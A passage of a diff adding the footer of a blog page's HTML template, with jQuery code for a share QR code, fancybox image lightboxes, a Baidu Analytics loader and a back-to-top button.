+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?8c349ebad6e132c9cbd08509cd6b0929";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
